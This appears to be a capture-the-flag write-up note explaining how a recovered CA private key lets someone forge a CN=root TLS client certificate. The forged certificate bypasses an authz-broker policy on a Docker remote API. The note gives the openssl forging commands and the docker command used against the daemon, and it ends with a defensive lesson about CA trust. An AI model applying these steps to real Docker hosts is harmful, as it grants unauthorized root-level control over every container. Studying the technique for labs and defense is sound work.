# Docker Remote API: Forging a TLS Client Cert to Bypass a CN-Based `authz-broker` Policy

When a Docker daemon is exposed with
[TLS client-certificate authentication](https://docs.docker.com/engine/security/protect-access/)
(`--tlsverify --tlscacert=... --tlscert=... --tlskey=...`), the daemon
itself only checks that the presented client cert chains to the configured
CA — it does not, on its own, grant differentiated permissions per client.
That's what an [authorization plugin](https://docs.docker.com/engine/extend/plugins_authorization/)
like `authz-broker` is for: it inspects the authenticated request and
approves/denies based on a policy file. `authz-broker`'s own `policy.json`
maps a client cert's **Common Name (CN)** directly to a named policy entry:

```json
{"name":"policy_1", "users": ["svc"],  "actions": ["container_list", "container_logs"]}
{"name":"policy_2", "users": ["root"], "actions": [""]}
```

An empty-string `actions` entry (`[""]`) is `authz-broker`'s wildcard —
unrestricted access for whichever `user` (i.e. CN) matches that policy row.

## The technique

If the CA's **private key** is recoverable from anywhere (a misconfigured
NFS/SMB export, a backup, a world-readable path, etc.) — not just its public
cert — a brand-new client certificate can be forged with **any CN**,
including one that maps to the unrestricted policy:

```bash
openssl genrsa -out client-key.pem 2048
openssl req -new -key client-key.pem -out client.csr -subj "/CN=root"
openssl x509 -req -in client.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial \
    -out client-cert.pem -days 365 -extfile <(echo "extendedKeyUsage=clientAuth")
openssl verify -CAfile ca.pem client-cert.pem   # must print "OK" before use
```

**Do not reuse an existing, already-issued client/server cert** (e.g. the
daemon's own server cert) for this — it almost certainly has a CN that
either doesn't match any policy row at all (denied by default) or matches a
more restricted one. Mint a fresh cert with the CN chosen deliberately to
match the policy you actually want.

```bash
docker --tlsverify --tlscacert=ca.pem --tlscert=client-cert.pem --tlskey=client-key.pem \
    -H=<host>:2376 ps -a
```

A daemon reachable this way with an unrestricted-policy cert gives full
`exec`/`cp` into every container on the host — root-equivalent access to
the whole Docker estate, not just one container.

## Why this matters beyond the specific policy shape

The general principle: an authorization layer bolted onto a
certificate-authenticated service is only as strong as the binding between
"holds a valid cert" and "is who the policy thinks they are." A CN-based
policy assumes the CA is the actual trust boundary — the moment the CA's
private key itself is recoverable, the policy layer provides no security at
all, since any CN (and therefore any policy row) can be self-issued. Treat
recovery of a CA private key as equivalent to recovering credentials for
*every* identity that CA can vouch for, not just whatever cert happened to
already exist.

## Seen on

- [[fries#Privesc|Fries]] — the CA key was recovered from a misconfigured
  NFSv3 export (`certs/`, only reachable via a supplementary-group `AUTH_SYS`
  trick — see [[nfsv3-auth-sys-trust-and-readdirplus-pitfalls]]); forging a
  fresh `CN=root` client cert against `authz-broker`'s policy gave
  unrestricted `docker exec`/`cp` into all five containers on the box,
  including one (`pwm`) that had no other reachable code-execution path.
